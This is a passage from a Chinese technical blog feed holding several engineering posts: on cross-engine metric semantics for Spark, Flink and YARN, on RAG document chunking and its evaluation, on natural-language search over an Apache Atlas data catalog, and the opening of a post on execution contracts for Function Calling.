<p>最终答案记录 query、检索过滤、候选列表、重排结果、上下文片段与模型输出。用户指出错误时，我们能判断是知识源错、切块错、召回错、排序错还是生成错，而不是一概归因“模型幻觉”。</p>
<h2 id="评测先拆-Retrieval-与-Answer"><a href="#评测先拆-Retrieval-与-Answer" class="headerlink" title="评测先拆 Retrieval 与 Answer"></a>评测先拆 Retrieval 与 Answer</h2><p>知识问答整体准确率下降，至少可能来自两段。retrieval 没拿到充分证据，再强的生成模型也只能猜；retrieval 已拿到证据，答案仍错，才重点看提示、上下文组织与生成。</p>
<p>我会给问题标注 supporting source&#x2F;chunk，先测 recall@k、MRR 与权限过滤后的有效召回，再在固定上下文上测答案正确性、引用支持度和拒答。这样更换 embedding 模型时不需要同时更换生成模型，能看到改动真正影响哪一段。</p>
<p>线上反馈也不能只有点赞。允许用户选择“来源过期”“没找到关键文档”“引用不支持结论”“无权看到”“答案组织不好”。这些标签进入修复队列，并沉淀成回归用例。知识 owner 负责源内容，平台负责索引与权限，模型团队负责生成，责任边界才不会混在一起。</p>
<p>向量检索值得使用，但它只是把搜索空间缩小。企业知识库的可信度来自来源身份、版本、权限、有效期、混合召回、引用和反馈闭环。先把这些工程环节补齐，再调 top-k 和 embedding 模型，效果才不会只停留在演示环境。</p>
<h2 id="参考论文与资料"><a href="#参考论文与资料" class="headerlink" title="参考论文与资料"></a>参考论文与资料</h2><ul>
<li><a href="https://arxiv.org/abs/2004.04906">Dense Passage Retrieval：双编码器与开放域问答的稠密检索</a></li>
<li><a href="https://arxiv.org/abs/2005.11401">Retrieval-Augmented Generation：检索结果作为生成模型的外部记忆</a></li>
<li><a href="https://arxiv.org/abs/1702.08734">FAISS：十亿级向量相似搜索的工程与算法研究</a></li>
<li><a href="https://arxiv.org/abs/1603.09320">HNSW：用于近似最近邻搜索的分层小世界图</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>向量检索</tag>
        <tag>RAG</tag>
        <tag>知识工程</tag>
      </tags>
  </entry>
  <entry>
    <title>Spark、Flink、YARN 指标怎么统一：先统一语义，不要先统一名字</title>
    <url>//2022/12/26/cross-engine-metric-semantics/</url>
    <content><![CDATA[<p>数据平台接入 Spark、Flink 和 YARN 指标后，通常很快会建出一张“统一监控大盘”。最常见的统一方式，是把包含 CPU 的字段都改名为 <code>cpu_usage</code>，包含 records 的都改成 <code>throughput</code>。图表变整齐了，数值却失去原义：一个是累计 CPU 时间，一个是滑动窗口忙碌时长，另一个甚至只是调度器分配的 vcore-seconds。</p>
<p>我做跨引擎可观测时，不追求让所有指标长得一样。先保存原始指标和完整语义，再挑出真正可比较的业务事实。统一名字只能解决查询方便，统一口径才可能支撑诊断。</p>
<p class="article-diagram-scroll"><img src="/images/articles/cross-engine-metric-semantics.svg" class="lazyload" data-srcset="/images/articles/cross-engine-metric-semantics.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="跨引擎指标先保留原义，再形成可比口径"></p>
<span id="more"></span>

<h2 id="一个指标至少有七个维度"><a href="#一个指标至少有七个维度" class="headerlink" title="一个指标至少有七个维度"></a>一个指标至少有七个维度</h2><p>指标名只是入口。一条可以被正确使用的指标，至少要说明：单位、类型、采集范围、时间窗口、聚合方式、重置条件和版本。</p>
<p>例如 <code>records_in</code> 是 Counter 还是 Meter？表示本次 Task 累计值，还是最近几秒每秒平均值？同一个 operator 有 64 个 subtasks 时，页面显示 sum、max 还是 average？作业恢复后计数是否清零？这些信息缺一个，告警规则就可能换一个引擎便失效。</p>
<p>我会把原始数据存成类似下面的契约：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">metric_name: flink.task.numRecordsInPerSecond</span><br><span class="line">unit: records/second</span><br><span class="line">kind: meter</span><br><span class="line">scope: operator_subtask</span><br><span class="line">window: engine_defined_recent_window</span><br><span class="line">aggregation: raw</span><br><span class="line">reset: task_attempt_restart</span><br><span class="line">engine_version: 1.15.3</span><br></pre></td></tr></table></figure>

<p>字段路径中保留 engine 和版本，不用平台统一名覆盖。语义层再把它映射为候选的 <code>record_rate</code>，并记录能否跨引擎比较。源定义变化时，只新增映射版本，历史报表仍按当时口径解释。</p>
<h2 id="Spark-的-executorRunTime-不是-CPU-时间"><a href="#Spark-的-executorRunTime-不是-CPU-时间" class="headerlink" title="Spark 的 executorRunTime 不是 CPU 时间"></a>Spark 的 executorRunTime 不是 CPU 时间</h2><p>Spark 3.3.1 <code>TaskMetrics</code> 同时提供 <code>executorRunTime</code> 和 <code>executorCpuTime</code>。官方监控文档把前者定义为 executor 花在运行这个 Task 上的毫秒数，包含从 driver 取结果的时间；后者是 executor 执行 Task 消耗的 CPU 时间，单位是纳秒。</p>
<p>只看名字就把二者都换算成“CPU 使用率”，会犯两个错误。第一，单位不同；第二，run time 是墙钟维度，CPU time 是累计处理器时间。多线程、本地等待、GC 和 IO 都会让它们的关系变化。可以在限制明确的场景下计算 <code>cpu_time / run_time</code> 作为效率线索，但不能把它当操作系统 CPU utilization 的直接替代。</p>
<p>Spark 的输入还分 <code>inputMetrics</code> 与 <code>shuffleReadMetrics</code>。前者的 bytes&#x2F;records 描述外部输入，后者描述 stage 之间的 shuffle 读取。把两者相加命名为“扫描量”，会把同一份数据在多个 stage 的内部交换重复计入。做存储扫描优化应看 input；诊断网络和数据倾斜则看 shuffle，不能共用一个阈值。</p>
<p><code>memoryBytesSpilled</code> 与 <code>diskBytesSpilled</code> 也不是当前内存和磁盘占用。它们表示 spill 过程中的累计量，同一批对象从内存估算后落盘，两个数字不适合简单相加成“总 spill 空间”。我会保留两条曲线，再结合 Task 分位数、GC time 和 shuffle fetch wait 判断瓶颈。</p>
<h2 id="Flink-的-busy-与-back-pressure-是窗口状态"><a href="#Flink-的-busy-与-back-pressure-是窗口状态" class="headerlink" title="Flink 的 busy 与 back pressure 是窗口状态"></a>Flink 的 busy 与 back pressure 是窗口状态</h2><p>Flink 1.15.3 为每个 subtask 暴露 idle、busy 和 back pressured time per second。官方文档说明，这三个值在任一时刻约合计 1000ms，按最近几秒更新。一个持续 50% 负载的 subtask，与一秒全忙、一秒空闲交替的 subtask，都可能显示约 500ms busy time。</p>
<p>因此 <code>busyTimeMsPerSecond=900</code> 不能和 Spark <code>executorCpuTime</code> 直接对比。它表达的是一个短窗口内 operator 是否忙于实际工作，不是进程消耗了多少 CPU。back pressure 又由输出 buffer 可用性判断，表示下游消费跟不上导致上游受压，并非“CPU 反压率”。</p>
<p>聚合规则同样会改变结论。Flink Web UI 对 JobGraph 展示的是 subtasks 的最大 back pressure 和 busy 值。max 适合发现最严重的瓶颈，但不能代表整个 operator 的平均负载。若平台采集后改成 average，单个热点 subtask 会被 63 个空闲 subtask 稀释；若用 sum，又会超过 1000ms 而失去比例含义。</p>
<p>我会同时保留 max、p50、p95 和每个 subtask 原值。诊断反压看 max&#x2F;p95 与拓扑传播方向；做容量趋势看各 subtask busy 的分布；判断吞吐看 numRecordsIn&#x2F;Out，但要先确认记录在算子内是否展开、过滤或聚合。records 并不是跨 SQL 都相同的业务行。</p>
<h2 id="YARN-的-resource-seconds-是容量账，不是利用率"><a href="#YARN-的-resource-seconds-是容量账，不是利用率" class="headerlink" title="YARN 的 resource-seconds 是容量账，不是利用率"></a>YARN 的 resource-seconds 是容量账，不是利用率</h2><p>Hadoop YARN 3.3.4 的 <code>ApplicationResourceUsageReport</code> 定义 memory-seconds 和 vcore-seconds：已分配的内存 MB 或 vcores 乘以运行秒数。一个应用申请 8 vcores、运行 600 秒，即使多数时间等待外部存储，也会积累 4800 vcore-seconds。</p>
<p>这类指标适合做队列容量与成本归因，因为调度器确实把资源份额留给了应用；它不回答 CPU 实际忙了多久。拿 YARN vcore-seconds 除以作业 wall time，再与 Spark CPU time 比较，会把 request 与 usage 混在一起。</p>
<p>平台需要并存两套事实：allocated 用于容量、配额和成本，actual 用于效率与性能。Kubernetes 的 requests&#x2F;limits&#x2F;usage 也是同样的关系。统一指标层若只留一个 <code>cpu</code>，后续既无法还原计费，也无法判断过度申请。</p>
<p>资源累积值还要绑定 application attempt。任务重试提交了三个 YARN applications，只展示最后成功的 resource-seconds，会把两次失败成本抹掉；直接按 job_id 汇总又可能混入并发补数。身份至少要对齐到 <code>job_instance_id + attempt + engine_application_id</code>。</p>
<h2 id="跨引擎真正可比的是业务分母"><a href="#跨引擎真正可比的是业务分母" class="headerlink" title="跨引擎真正可比的是业务分母"></a>跨引擎真正可比的是业务分母</h2><p>引擎内部指标最适合内部诊断：Spark 的 shuffle&#x2F;spill，Flink 的 back pressure&#x2F;watermark，YARN 的 allocated resources。跨引擎比较应尽量回到业务上等价的事实，例如处理相同输入快照、产出相同结果约束时：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">端到端完成时间</span><br><span class="line">每 GB 有效输入的 allocated vcore-seconds</span><br><span class="line">每百万有效输出行的计算与存储成本</span><br><span class="line">失败重试成本</span><br><span class="line">SLA 达成率</span><br><span class="line">发布后质量检查结果</span><br></pre></td></tr></table></figure>

<p>这里每个分母都要定义。输入 bytes 是压缩前还是存储读取量？输出 rows 是 sink 收到的记录，还是去重后提交的业务行？流任务没有自然结束时间，就按固定业务窗口计算，并标明窗口完整性和 watermark 截止点。</p>
<p>我不会做一个笼统的“引擎性能排行榜”。同一 SQL 在不同执行计划、并行度、文件布局、缓存和数据分布下，跑分没有迁移意义。对比实验要固定输入快照、代码、资源上限、并行度策略和冷&#x2F;热缓存条件，至少重复多次，再解释差异来自哪里。</p>
<h2 id="缺失值与晚到值不能自动填零"><a href="#缺失值与晚到值不能自动填零" class="headerlink" title="缺失值与晚到值不能自动填零"></a>缺失值与晚到值不能自动填零</h2><p>监控采集中断时，零表示真实没有发生，null 表示不知道。Flink busy time 可能因无法计算返回 NaN；Spark application 结束前的最后一批 TaskMetrics 可能晚到；YARN application 被快速清理后也可能拿不到最终 report。全部填零会让故障期间的利用率显得异常健康。</p>
<p>每个点应带 <code>event_time</code>、<code>observed_at</code>、<code>completeness</code> 和 source status。累计 Counter 出现下降，先判断 attempt 重启或 exporter reset，再计算 rate；Gauge 可按短窗口保留最后值，但超出 freshness TTL 后必须标 stale。报表需要展示覆盖率，告警计算也要区分“超过阈值”和“指标缺失”。</p>
<p>平台自己的派生指标要可回放。映射规则、聚合窗口和单位转换写成版本化配置，用保存的 raw metrics 重算；不能只落最终宽表。一次引擎升级后曲线突变时，我们才有办法判断是工作负载变化，还是指标定义&#x2F;采集路径变化。</p>
<p>跨引擎指标统一的价值，不是把不同系统压成一套漂亮字段，而是让使用者知道哪些数可以比较、哪些只能在引擎内解释。保留原义、绑定身份、声明窗口和聚合，再从业务分母生成派生事实，监控才不会在最需要它时给出错误方向。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/apache/spark/blob/fbbcf9434ac070dd4ced4fb9efe32899c6db12a9/core/src/main/scala/org/apache/spark/executor/TaskMetrics.scala#L42-L104">Apache Spark 3.3.1：TaskMetrics 中 executor run&#x2F;cpu time、spill、input 与 shuffle 指标</a></li>
<li><a href="https://github.com/apache/spark/blob/fbbcf9434ac070dd4ced4fb9efe32899c6db12a9/docs/monitoring.md#L637-L699">Apache Spark 3.3.1：监控文档对 executorRunTime、executorCpuTime 及单位的定义</a></li>
<li><a href="https://github.com/apache/flink/blob/c41c8e5cfab683da8135d6c822693ef851d6e2b7/docs/content/docs/ops/monitoring/back_pressure.md#L35-L78">Apache Flink 1.15.3：back pressure、idle 与 busy 的窗口和聚合语义</a></li>
<li><a href="https://github.com/apache/flink/blob/c41c8e5cfab683da8135d6c822693ef851d6e2b7/docs/content/docs/ops/metrics.md#L1476-L1552">Apache Flink 1.15.3：Task&#x2F;Operator records 与 time-per-second 指标定义</a></li>
<li><a href="https://github.com/apache/hadoop/blob/a585a73c3e02ac62350c136643a5e7f6095a3dbb/hadoop-yarn-project/hadoop-yarn/hadoop-yarn-api/src/main/java/org/apache/hadoop/yarn/api/records/ApplicationResourceUsageReport.java#L125-L159">Apache Hadoop 3.3.4：memory-seconds 与 vcore-seconds 是资源分配量乘运行秒数</a></li>
</ul>
]]></content>
      <categories>
        <category>平台稳定性</category>
      </categories>
      <tags>
        <tag>可观测性</tag>
        <tag>Apache YARN</tag>
        <tag>Apache Spark</tag>
        <tag>Apache Flink</tag>
      </tags>
  </entry>
  <entry>
    <title>RAG 文档怎么切：别先争 500 还是 1000 字，先拿问题做回放</title>
    <url>//2023/03/27/rag-chunking-by-question/</url>
    <content><![CDATA[<p>做 RAG 时，第一个容易陷进去的参数是 <code>chunk_size</code>。500 字还是 1000 字、overlap 取 50 还是 100，大家常凭几个问答效果争论。这个讨论缺少一个前提：我们希望每个 chunk 保住什么证据。</p>
<p>我不会先从字数出发，而是整理真实问题，为每个问题标注“最小充分证据”。切块策略能让这些证据稳定被召回，条件和结论没有被拆散，同时不带进大段无关内容，才算有效。</p>
<p class="article-diagram-scroll"><img src="/images/articles/rag-chunking-by-question.svg" class="lazyload" data-srcset="/images/articles/rag-chunking-by-question.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="用问题验证切块，而不是先猜 chunk_size"></p>
<span id="more"></span>

<h2 id="先标最小充分证据"><a href="#先标最小充分证据" class="headerlink" title="先标最小充分证据"></a>先标最小充分证据</h2><p>问题“任务失败后默认重试几次”需要的证据，不只是“重试 3 次”这一句。若文档上一段写着“离线同步任务”，同一行右侧表头写着“生产环境默认值”，两者都是答案成立的条件。只标答案短语，会奖励一个容易断章取义的切块器。</p>
<p>我给每个问题保存：问题文本、目标 source&#x2F;version、必要 span、适用条件、允许的等价证据和不可接受的干扰证据。span 可以跨相邻段落，但要尽量小，避免把整页都标成正确答案。</p>
<p>这份标注首先用于测 retrieval。固定 embedding、索引参数和 top-k，分别跑不同切块策略，统计充分证据 recall、条件完整率和噪声 token。生成模型先不参与，否则它可能凭已有知识答对，掩盖检索根本没有拿到依据。</p>
<p>DPR 与 RAG 的工作都把 retrieval 与 generation 明确分成可讨论的部分。工程评测也应沿用这个边界：先问“证据有没有被拿到”，再问“模型有没有用对证据”。整体答案正确率无法定位 chunker 的问题。</p>
<h2 id="结构边界通常比字符边界可靠"><a href="#结构边界通常比字符边界可靠" class="headerlink" title="结构边界通常比字符边界可靠"></a>结构边界通常比字符边界可靠</h2><p>技术文档自带标题、段落、列表、表格、代码块和引用关系。它们比每 N 个字符切一刀更接近作者表达的知识单元。我先解析文档结构，再在过长节点内部二次拆分。</p>
<p>标题需要作为祖先上下文附在子块上，但不用在每个 chunk 重复整条目录。可以保存 <code>section_path</code> 结构字段，embedding 文本只加入最必要的父标题。这样检索“生产环境超时”时知道当前段属于哪个模块，又不会让大量相同标题主导相似度。</p>
<p>列表要判断项目是否共享前置句。下面有十个配置项时，单个列表项可独立索引，但要附上引导句和字段含义。定义列表则尽量把术语与解释放在一起。纯字符切分最容易把 key 留在上一块、value 留在下一块。</p>
<p>代码块与配置块不按自然语言句子拆。过长代码以函数、类或配置段为单位，附文件路径、语言和版本。用户搜错误栈时需要精确 token，代码索引可以同时建立关键词通道，不必指望 embedding 记住每个类名。</p>
<h2 id="表格需要重建行列语义"><a href="#表格需要重建行列语义" class="headerlink" title="表格需要重建行列语义"></a>表格需要重建行列语义</h2><p>把 Markdown 或 HTML 表格直接转成连续文本，常会丢列头与合并单元格。用户问“高优先级任务默认并发是多少”，检索命中的可能只有一行 <code>高 | 20 | 5</code>，模型无法知道 20 是并发还是超时。</p>
<p>我会把每行重建成带表名和列名的记录：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">表：任务资源默认值</span><br><span class="line">环境：生产</span><br><span class="line">优先级：高</span><br><span class="line">最大并发：20</span><br><span class="line">失败重试：5</span><br></pre></td></tr></table></figure>

<p>小表可以整表作为父块，每行作为子块；检索先命中行，再把父表头和相邻必要行带入上下文。大表则按业务键分组，不能整张塞入。合并单元格的值向下填充，但保留原始坐标，答案引用仍能回到原表。</p>
<p>表格有脚注时，脚注与对应列&#x2F;行建立引用关系。很多限制条件藏在表下的一句话里，只召回数据行会得到错误结论。最小充分证据标注能直接暴露这类切分缺陷。</p>
<h2 id="父子块比盲目-overlap-更可控"><a href="#父子块比盲目-overlap-更可控" class="headerlink" title="父子块比盲目 overlap 更可控"></a>父子块比盲目 overlap 更可控</h2><p>固定 overlap 能缓解边界截断，但也制造大量近重复 chunk。top-k 被同一段的五个重叠版本占满，其他来源进不了上下文；更新时还要判断哪些重叠块受影响。</p>
<p>父子块更容易解释。子块用于精确召回，父块保存完整小节；命中后按问题复杂度扩展父块或相邻兄弟。扩展必须有 token 上限和去重，不能命中一句就把整篇文档搬进来。</p>
<p>邻接扩展也要看结构。代词“该配置”需要上一段，结论后的例外条件可能在下一段。可以在 parser 阶段建立 <code>previous/next/parent</code>，重排后只为高分候选选择性扩展。比所有 chunk 固定重叠 20% 更节省上下文，也更容易审计来源。</p>
<p>长文档还需要跨章节关系。术语定义在开头，操作步骤在后面，二者不适合合并成一个巨块。把术语作为实体或 glossary relation 关联到步骤 chunk，查询时通过结构化关系补充定义。</p>
<h2 id="切块版本必须能灰度和回滚"><a href="#切块版本必须能灰度和回滚" class="headerlink" title="切块版本必须能灰度和回滚"></a>切块版本必须能灰度和回滚</h2><p>切块结果不是一次性离线产物。parser 修复了表格，chunker 调整了父子规则，embedding 模型也可能升级。若所有向量写进同一 collection 且没有版本，线上效果变化后无法知道是哪一步导致。</p>
<p>每个 chunk 保存 <code>source_version</code>、<code>parser_version</code>、<code>chunker_version</code>、<code>embedding_model</code> 与内容哈希。索引发布生成独立 <code>index_version</code>。同一批问题在旧、新索引离线回放，通过后灰度部分查询，最后切换 alias；回退只需切回旧 alias。</p>
<p>增量更新按 source version 做。文档某小节变化，只重建受影响结构节点及关系，不必全库重算；已删除片段先 tombstone，在检索层立即不可见，再异步清理物理向量。这样新旧版本不会一起回答。</p>
<p>评测报告除了 recall@k，还要显示每个问题缺了哪个条件、带入多少重复 token、命中几个不同来源。平均分提高可能掩盖关键制度类问题退化，重要问题应设单独门槛。</p>
<h2 id="生成阶段要验证引用覆盖"><a href="#生成阶段要验证引用覆盖" class="headerlink" title="生成阶段要验证引用覆盖"></a>生成阶段要验证引用覆盖</h2><p>检索拿到充分证据后，生成仍可能只引用其中一半。答案中的每个关键结论要能映射到具体 source span；适用条件不能从最终文本里消失。多片段组合时，检查它们是否属于兼容的版本和环境。</p>
<p>若问题需要两条证据而只召回一条，系统应指出缺口，不让模型补全。若同一配置在两个有效文档中冲突，返回冲突与 owner，而不是用相似度高低替代治理规则。</p>
<p>我会把错误反馈回切块层：没有召回、召回不完整、噪声过多、表头丢失、代码标识不命中、引用定位失败。每类问题的修复方式不同。统一改大 chunk_size，通常会改善一种错误，又扩大上下文噪声和成本。</p>
<p>文档切块没有全局最佳数字。可用的方法是从真实问题和充分证据出发，让结构解析、召回与生成分别接受检验。这样每次参数调整都有可比较结果，RAG 也从“试几个数字看感觉”变成可回归的工程系统。</p>
<h2 id="参考论文与资料"><a href="#参考论文与资料" class="headerlink" title="参考论文与资料"></a>参考论文与资料</h2><ul>
<li><a href="https://arxiv.org/abs/2004.04906">Dense Passage Retrieval：问题和段落的稠密向量检索</a></li>
<li><a href="https://arxiv.org/abs/2005.11401">Retrieval-Augmented Generation：检索与生成的组合边界</a></li>
<li><a href="https://arxiv.org/abs/2104.08663">BEIR：跨领域信息检索的异构评测基准</a></li>
<li><a href="https://arxiv.org/abs/1908.10084">Sentence-BERT：用于语义相似检索的句向量表示</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>RAG</tag>
        <tag>文档切块</tag>
        <tag>检索评测</tag>
      </tags>
  </entry>
  <entry>
    <title>让自然语言成为数据 Catalog 的入口：模型负责解析，Catalog 负责给出对象</title>
    <url>//2023/04/24/catalog-natural-language-entry/</url>
    <content><![CDATA[<p>数据 Catalog 常见的问题不是没有资产，而是用户不知道该怎么找。平台要求先选实体类型，再填库、表、标签、负责人，只有熟悉元数据模型的人才能用好。自然语言适合作为入口，但它不该绕开 Catalog，直接让模型根据一堆描述猜表。</p>
<p>我的设计是两段式：模型把问题解析成结构化检索意图，Catalog 用确定性查询返回实体；模型再基于实体和关系组织答案。对象身份、权限和血缘事实仍由 Catalog 决定。</p>
<p class="article-diagram-scroll"><img src="/images/articles/catalog-natural-language-entry.svg" class="lazyload" data-srcset="/images/articles/catalog-natural-language-entry.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="自然语言进入 Catalog 的两段解析"></p>
<span id="more"></span>

<h2 id="先把问题拆成-Catalog-能理解的条件"><a href="#先把问题拆成-Catalog-能理解的条件" class="headerlink" title="先把问题拆成 Catalog 能理解的条件"></a>先把问题拆成 Catalog 能理解的条件</h2><p>“找一下生产环境的订单明细表，谁负责，上游从哪来”至少包含四部分：实体类型是 table，环境是 production，关键词是订单明细，需要返回 owner 和 upstream lineage。模型输出固定 JSON，不直接输出 Atlas DSL：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;entity_types&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;hive_table&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;keywords&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;订单&quot;</span><span class="punctuation">,</span> <span class="string">&quot;明细&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;filters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;environment&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;op&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eq&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;prod&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;relations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;owner&quot;</span><span class="punctuation">,</span> <span class="string">&quot;upstream&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;limit&quot;</span><span class="punctuation">:</span> <span class="number">10</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>字段、操作符和最大 limit 都由工具 schema 限制。平台把业务叫法映射到真实类型和属性，再生成 Catalog 原生搜索参数。模型不知道某属性时不能自己加一个 <code>is_prod=true</code>，而是返回未识别条件或使用受控的 alias dictionary。</p>
<p>Apache Atlas 2.2.0 的 <code>SearchParameters</code> 本身就区分 query、typeName、classification、termName、entity filters、tag filters、includeSubTypes 等字段。这些是自然语言意图可以映射的确定性能力。直接生成自由 DSL 会扩大语法和权限面，也难以校验每个条件来自用户还是模型推断。</p>
<p>解析结果要展示给用户。尤其“销售订单”可能是业务术语，也可能是表名关键词；“生产”可能指环境、集群或数据状态。低置信度条件进入候选问题，不偷偷选一个含义。</p>
<h2 id="搜索返回的是候选实体，不是答案文本"><a href="#搜索返回的是候选实体，不是答案文本" class="headerlink" title="搜索返回的是候选实体，不是答案文本"></a>搜索返回的是候选实体，不是答案文本</h2><p>全文检索适合找名称、描述和别名，类型&#x2F;属性过滤负责约束范围，glossary term 与 classification 表示治理语义。它们应组合使用，而不是先把所有实体说明 embedding 后只按相似度排序。</p>
<p>每个候选至少返回 GUID、typeName、qualifiedName、display name、owner、状态、更新时间和匹配原因。<code>qualifiedName</code> 与 GUID 用于稳定识别对象，display name 只用于展示。同名表在不同 cluster&#x2F;database 中是不同实体，不能让模型把名称最像的那个当唯一答案。</p>
<p>Atlas 的 Hive Hook 文档明确用 <code>db.table@cluster</code> 组成 table qualifiedName，并用它去重实体。自然语言层可以解释“生产订单表”，最终仍要落到具体 qualifiedName。若存在多个候选，应列出环境、库和 owner 让用户确认。</p>
<p>排序我会混合几类信号：精确名称&#x2F;别名、业务术语关联、描述相关度、环境与类型匹配、使用热度、认证状态和新鲜度。热度只能是辅助，不能让一个被频繁误用的表压过官方认证资产。</p>
<h2 id="关系展开必须从实体-ID-出发"><a href="#关系展开必须从实体-ID-出发" class="headerlink" title="关系展开必须从实体 ID 出发"></a>关系展开必须从实体 ID 出发</h2><p>用户确认实体后，再用 GUID 展开 columns、owner、glossary、classification 与 lineage。不要把候选表名重新交给模型生成第二次搜索，否则两阶段可能落到不同对象。</p>
<p>血缘回答需要方向、深度和过程类型。问“上游从哪来”时，默认只展开一到两层并标注直接&#x2F;间接，避免把整个图返回。若某条边来自解析 SQL、某条边来自人工补录，证据等级应不同。模型可以按关系生成解释，但不能补一条图中不存在的边。</p>
<p>Atlas 的 Lineage REST 接口要求实体类型与唯一属性值，并注明这个属性应在实体间唯一，例如 qualifiedName。这个接口设计再次强调：关系查询需要稳定对象身份，不是模糊文本。</p>
<p>权限在每次关系展开时检查。用户能看到表，不一定能看到敏感列、负责人信息或跨域血缘。先从 Catalog 权限层拿到过滤后的图，再进入模型上下文，不能生成后靠关键词脱敏。</p>
<h2 id="元数据缺失要原样暴露"><a href="#元数据缺失要原样暴露" class="headerlink" title="元数据缺失要原样暴露"></a>元数据缺失要原样暴露</h2><p>自然语言入口会让 Catalog 的质量问题更快暴露。用户问 owner，实体字段为空；问业务含义，description 只有“ODS table”；问生产环境，环境属性没有统一枚举。模型最容易把这些空白补成流畅答案。</p>
<p>我要求答案区分三种状态：Catalog 已确认的事实、根据名称&#x2F;关系得出的推断、当前缺失。推断需要明确标注，例如“从 qualifiedName 判断可能属于 prod 集群”；缺失则给出 owner 补录入口或治理工单，而不是生成一个常见团队名。</p>
<p>别名也要治理。口语“交易明细”“订单流水”可能都指一个术语，也可能在两个部门含义不同。alias dictionary 带 namespace、owner、有效期和映射对象。用户纠正后进入审核，不让单次对话直接改全局词典。</p>
<p>搜索无结果不等于资产不存在。可能是权限过滤、采集延迟、类型映射不全或用户条件冲突。响应中返回各阶段候选数和过滤原因的汇总，让使用者知道系统查过什么范围。</p>
<h2 id="评测对象是“找对实体”"><a href="#评测对象是“找对实体”" class="headerlink" title="评测对象是“找对实体”"></a>评测对象是“找对实体”</h2><p>Catalog 问答首先测 entity resolution，而不是答案写得是否自然。为真实问题标注目标 GUID&#x2F;qualifiedName、所需关系和允许的候选集合，统计 top-1、top-k、歧义识别与越权泄露。</p>
<p>同名对象、历史表、测试&#x2F;生产、简称、拼写错误和跨语言描述要单独建用例。模型升级后只看平均命中率，可能把最危险的“测试表误当生产表”藏在总体提升里。</p>
<p>线上保存解析意图、生成的 SearchParameters、候选及分数、用户选择和最终关系查询。用户点击第二个候选，比一个笼统的差评更能说明排序问题。选中后又返回，可能说明实体找对了但元数据内容不够。</p>
<p>自然语言入口的目标，是让人不用学习 Catalog 的查询表单，也能进入同一套实体与关系体系。模型负责理解表达差异，Catalog 负责对象身份、过滤和证据。两层边界清楚后，体验可以变自然，治理底座仍然可靠。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/apache/atlas/blob/1a4735939f3ec3ed225f1d12e40653b8eaf610b3/intg/src/main/java/org/apache/atlas/model/discovery/SearchParameters.java#L41-L127">Apache Atlas 2.2.0 <code>SearchParameters</code>：query、type、classification、term 与 filter 字段</a></li>
<li><a href="https://github.com/apache/atlas/blob/1a4735939f3ec3ed225f1d12e40653b8eaf610b3/docs/src/documents/Search/SearchBasic.md">Apache Atlas 2.2.0 Basic Search：全文、类型、分类和属性过滤</a></li>
<li><a href="https://github.com/apache/atlas/blob/1a4735939f3ec3ed225f1d12e40653b8eaf610b3/docs/src/documents/Hook/HookHive.md#L21-L56">Apache Atlas 2.2.0 Hive Hook：qualifiedName 格式与实体去重</a></li>
<li><a href="https://github.com/apache/atlas/blob/1a4735939f3ec3ed225f1d12e40653b8eaf610b3/webapp/src/main/java/org/apache/atlas/web/rest/LineageREST.java#L106-L146">Apache Atlas 2.2.0 Lineage REST：用唯一属性定位实体</a></li>
</ul>
]]></content>
      <categories>
        <category>数据治理</category>
      </categories>
      <tags>
        <tag>Apache Atlas</tag>
        <tag>数据 Catalog</tag>
        <tag>自然语言检索</tag>
      </tags>
  </entry>
  <entry>
    <title>Function Calling 上线后，模型到工具之间还缺一份执行契约</title>
    <url>//2023/06/14/function-calling-tool-contract/</url>
    <content><![CDATA[<p>OpenAI 昨天发布 Function Calling 后，模型与外部工具之间终于有了比“在文本里吐一段 JSON”更明确的接口：开发者描述函数，模型可以选择函数并生成参数。这个能力会明显降低 Agent 工具接入成本，但它解决的是参数生成，不是安全执行。</p>
<p>我会把模型输出叫作 tool call proposal。它必须经过协议、业务、权限和风险检查，才会变成真实调用。少了这层执行契约，JSON 越稳定，错误动作反而越容易自动落地。</p>
<p class="article-diagram-scroll"><img src="/images/articles/function-calling-tool-contract.svg" class="lazyload" data-srcset="/images/articles/function-calling-tool-contract.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Function Calling 到真实工具之间的执行契约"></p>
<span id="more"></span>

